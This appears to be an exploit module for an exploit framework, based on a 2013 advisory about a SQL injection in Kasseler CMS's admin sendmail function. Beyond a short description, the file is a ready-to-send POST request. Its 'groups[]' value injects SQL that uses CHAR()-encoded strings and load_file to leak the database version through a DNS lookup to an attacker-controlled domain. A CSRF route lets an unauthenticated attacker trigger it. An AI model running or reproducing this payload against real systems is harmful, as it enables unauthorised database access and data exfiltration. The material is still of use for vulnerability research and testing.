# -*- coding: utf-8 -*-

NAME = "Kasseler CMS 2 r1223 - SQL injection"
DESCRIPTION = '''The vulnerability exists due to insufficient validation of "groups" HTTP POST parameter passed to "/admin.php" script. A remote authenticated administrator can execute arbitrary SQL commands in  application's database.
This vulnerability could also be exploited by a remote non-authenticated attacker via CSRF vector, since the application is prone to Cross-Site Request Forgery (CSRF) attacks. In order to do so an attacker should trick logged-in administrator to visit a webpage with CSRF exploit.

This basic CSRF exploit is based on DNS Exfiltration technique and may be used if the database of the vulnerable application is hosted on a Windows platform. It will send a DNS request demanding IP addess for `version()` (or any other sensetive output from the database) subdomain of ".attacker.com" (a domain name, DNS server of which is controlled by the attacker).'''
AUTHOR = "High-Tech Bridge Security Research Lab"
AUTHOR_URL = "https://www.htbridge.com/advisory/"
DATE = "2013-07-03"

METHOD = "POST"
PATH = "/admin.php?module=sendmail&do=send"

PARAMS = [
    {
        "name": "title",
        "value": "1",
        "custom": False
    },
    {
        "name": "message",
        "value": "1",
        "custom": False
    },
    {
        "name": "attache_page",
        "value": "1",
        "custom": False
    },
    {
        "name": "groups[]",
        "value": "123) OR 1=(select load_file(CONCAT(CHAR(92),CHAR(92),(select version()),CHAR(46),CHAR(97),CHAR(116),CHAR(116),CHAR(97),CHAR(99),CHAR(107),CHAR(101),CHAR(114),CHAR(46),CHAR(99),CHAR(111),CHAR(109),CHAR(92),CHAR(102),CHAR(111),CHAR(111),CHAR(98),CHAR(97),CHAR(114)))) --",
        "custom": True,
        "description": "The SQL command to execute"
    }
]